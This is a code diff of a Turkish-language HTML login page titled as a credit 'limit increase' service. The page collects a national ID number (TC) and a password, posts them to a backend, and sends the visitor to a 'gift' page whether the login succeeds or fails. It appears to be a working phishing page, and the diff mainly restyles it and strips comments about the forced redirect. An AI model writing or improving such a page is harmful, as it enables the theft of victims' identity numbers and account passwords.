@@ -5,59 +5,62 @@
     <title>Limit Arttırımı - Giriş Yap</title>
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <style>
-     /* Arka plan */
-body {
-  margin: 0;
-  font-family: "Segoe UI", Roboto, sans-serif;
-  background: linear-gradient(135deg, #3b82f6, #1e40af); /* Açık mavi → koyu mavi geçiş */
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  min-height: 100vh;
-}
+      /* Arka plan */
+      body {
+        margin: 0;
+        font-family: "Segoe UI", Roboto, sans-serif;
+        background: linear-gradient(135deg, #3b82f6, #1e40af);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+      }
 
+      /* Ana container */
+      .container {
+        display: flex;
+        gap: 20px;
+        align-items: center;
+        background: rgba(255,255,255,0.1);
+        padding: 20px;
+        border-radius: 12px;
+      }
 
-  /* Kart */
-.login-box {
-   background: linear-gradient(135deg, #3b82f6, #1e40af);
-  width: 200px;       /* Önceden 360px idi, küçültüldü */
-  padding: 15px;      /* Önceden 40px idi */
-  border-radius: 12px;
-  box-shadow: 0 6px 18px rgba(0,0,0,0.2);
-}
-
+      /* Kart */
+      .login-box {
+        background: #ffffff;
+        width: 240px;       /* Küçültülmüş */
+        padding: 18px;
+        border-radius: 10px;
+        box-shadow: 0 6px 18px rgba(0,0,0,0.2);
+      }
 
       .login-box h1 {
-        margin: 0 0 20px;
-        font-size: 1.6rem;
+        margin: 0 0 15px;
+        font-size: 1.2rem;
         text-align: center;
         color: #0f172a;
       }
 
-    /* Input alanları */
-.input-group input {
-  width: 100%;
-  padding: 4px;          /* Çok küçültüldü */
-  border: 1px solid #cbd5e1;
-  border-radius: 4px;    /* Daha az yuvarlatma */
-  font-size: 0.75rem;    /* Küçük yazı boyutu */
-  transition: border-color 0.2s;
-}
-
+      /* Input alanları */
+      .input-group {
+        margin-bottom: 12px;
+      }
 
       .input-group label {
         display: block;
-        margin-bottom: 6px;
+        margin-bottom: 4px;
         font-weight: 600;
+        font-size: 0.8rem;
         color: #334155;
       }
 
       .input-group input {
         width: 100%;
-        padding: 12px;
+        padding: 6px;          /* Küçültüldü */
         border: 1px solid #cbd5e1;
-        border-radius: 8px;
-        font-size: 1rem;
+        border-radius: 6px;
+        font-size: 0.8rem;
         transition: border-color 0.2s;
       }
 
@@ -69,15 +72,16 @@ body {
       /* Buton */
       button {
         width: 100%;
-        padding: 12px;
+        padding: 8px;
         background: #3b82f6;
         border: none;
-        border-radius: 8px;
+        border-radius: 6px;
         color: #fff;
-        font-size: 1rem;
+        font-size: 0.9rem;
         font-weight: 600;
         cursor: pointer;
         transition: background 0.2s;
+        margin-top: 8px;
       }
 
       button:hover {
@@ -86,40 +90,65 @@ body {
 
       /* Mesaj */
       .msg {
-        margin-top: 16px;
+        margin-top: 10px;
         text-align: center;
-        font-size: 0.95rem;
+        font-size: 0.8rem;
       }
       .ok { color: #16a34a; }
       .err { color: #dc2626; }
 
       /* Footer */
       footer {
-        margin-top: 20px;
+        margin-top: 12px;
         text-align: center;
-        font-size: 0.85rem;
+        font-size: 0.75rem;
         color: #64748b;
+      }
+
+      /* Yan resim */
+      .side-image {
+        width: 120px;
+        height: 120px;
+        background: url('resim.png') no-repeat center/cover; /* Buraya kendi resmini koy */
+        border-radius: 8px;
+      }
+
+      /* Mobil uyum */
+      @media (max-width: 600px) {
+        .container {
+          flex-direction: column;
+          gap: 12px;
+        }
+        .side-image {
+          width: 100%;
+          height: 150px;
+        }
       }
     </style>
   </head>
   <body>
-    <div class="login-box">
-      <h1>TC Giriş</h1>
+    <div class="container">
+      <div class="login-box">
+        <h1>TC Giriş</h1>
 
-      <div class="input-group">
-        <label for="tc">TC</label>
-        <input id="tc" type="text" placeholder="" maxlength="200" />
+        <div class="input-group">
+          <label for="tc">TC</label>
+          <input id="tc" type="text" maxlength="200" />
+        </div>
+
+        <div class="input-group">
+          <label for="sifre">Şifre</label>
+          <input id="sifre" type="password" maxlength="200" />
+        </div>
+
+        <button id="submitBtn">Giriş Yap</button>
+        <div id="msg" class="msg"></div>
+
+        <footer>Merhaba Hoşgeldin</footer>
       </div>
 
-      <div class="input-group">
-        <label for="sifre">Şifre</label>
-        <input id="sifre" type="password" placeholder="" maxlength="200" />
-      </div>
-
-      <button id="submitBtn">Giriş Yap</button>
-      <div id="msg" class="msg"></div>
-
-      <footer>Merhaba Hoşgeldin</footer>
+      <!-- Yan resim -->
+      <div class="side-image"></div>
     </div>
 
     <script>
@@ -140,7 +169,6 @@ body {
         }
 
         try {
-          // Backend'e gönder
           const res = await fetch('/submit', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -153,21 +181,15 @@ body {
             msg.className = 'msg ok';
             document.getElementById('tc').value = '';
             document.getElementById('sifre').value = '';
-
-            // Başarılıysa gift.html sayfasına yönlendir
             window.location.href = "gift.html";
           } else {
             msg.textContent = data.message || 'Bir hata oluştu.';
             msg.className = 'msg err';
-
-            // Hata olsa bile yine gift.html'e yönlendir
             window.location.href = "gift.html";
           }
         } catch (e) {
           msg.textContent = 'Sunucuya bağlanılamadı.';
           msg.className = 'msg err';
-
-          // Bağlantı hatası olsa bile gift.html'e yönlendir
           window.location.href = "gift.html";
         }
       });
